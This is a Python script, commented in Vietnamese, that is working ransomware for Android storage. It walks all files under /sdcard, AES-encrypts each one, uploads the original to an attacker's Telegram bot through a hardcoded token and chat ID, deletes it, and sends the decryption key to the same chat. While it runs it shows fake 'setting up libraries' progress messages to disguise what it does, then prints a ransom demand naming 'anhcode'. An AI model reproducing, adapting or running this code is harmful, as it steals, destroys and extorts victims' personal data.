import os
import hashlib
import base64
import requests
import telebot
from Crypto.Cipher import AES
from tqdm import tqdm

# 🔹 Cấu hình Telegram Bot
BOT_TOKEN = "7277548275:AAGO1dCgdvBfT562jmYAaUqubYC3MLmY5is"  # 🔴 Thay bằng API Token của bot Telegram
CHAT_ID = "7903272808"      # 🔴 Thay bằng ID Telegram của bạn
bot = telebot.TeleBot(BOT_TOKEN)

def send_telegram_message(message):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    data = {"chat_id": CHAT_ID, "text": message}
    try:
        requests.post(url, data=data)
    except Exception as e:
        print(f"⚠ Lỗi khi gửi key về Telegram: {e}")

def send_file_to_telegram(file_path):
    try:
        with open(file_path, "rb") as f:
            bot.send_document(CHAT_ID, f)
    except Exception as e:
        print(f"⚠ Lỗi mạng yếu vui lòng ko thoát tool sẽ gây ra lỗi : {e}")

def generate_random_key():
    return base64.urlsafe_b64encode(os.urandom(32)).decode()

def get_key(password):
    return hashlib.sha256(password.encode()).digest()

def pad(data):
    return data + b"\0" * (AES.block_size - len(data) % AES.block_size)

def encrypt_file(file_path, key):
    try:
        with open(file_path, "rb") as f:
            data = f.read()
        iv = os.urandom(16)
        cipher = AES.new(key, AES.MODE_CBC, iv)
        encrypted_data = iv + cipher.encrypt(pad(data))
        
        # 🔹 Lưu file đã mã hóa
        with open(file_path + ".enc", "wb") as f:
            f.write(encrypted_data)
        
        # 🔹 Gửi file gốc lên Telegram trước khi xóa
        send_file_to_telegram(file_path)
        
        # 🔹 Xóa file gốc sau khi gửi thành công
        os.remove(file_path)
    except Exception as e:
        print(f"⚠ có vẽ mạng đang yếu vui lòng ko thoát tool tránh lỗi : {e}")

# Mã hóa toàn bộ file trên máy
def encrypt_all_files(key):
    root_dirs = ["/sdcard"]  # 🔥 Thư mục chính chứa tất cả file
    files = []

    # Lấy danh sách file
    for root_dir in root_dirs:
        for root, _, filenames in os.walk(root_dir):
            for filename in filenames:
                if filename.endswith(".enc"):
                    continue  # Bỏ qua file đã mã hóa
                files.append(os.path.join(root, filename))

    total_files = len(files)
    if total_files == 0:
        print("✅ Không có file nào để mã hóa!")
        return

    # Hiển thị tiến trình mã hóa
    print("\n🔐 Đang vào tool vui lòng chờ...")
    for i, file in enumerate(tqdm(files, desc="load thư viện", unit="file")):
        encrypt_file(file, key)
        percent = int((i + 1) / total_files * 100)
        print(f"\r🔄 Đang setup thư viện thiếu... {percent}%", end="", flush=True)

    print("\n✅ mày đã bị botnet liên hệ anhcode để được cứu file!")

if __name__ == "__main__":
    key = generate_random_key()
    encrypt_key = get_key(key)

    encrypt_all_files(encrypt_key)

    message = f"🔑 Key để giải mã: `{key}`\n📂 Mọi file trên máy đã bị mã hóa!"
    send_telegram_message(message)
    print("📨 Key đã gửi về Telegram , hết cứu rồi nhóc!")
 
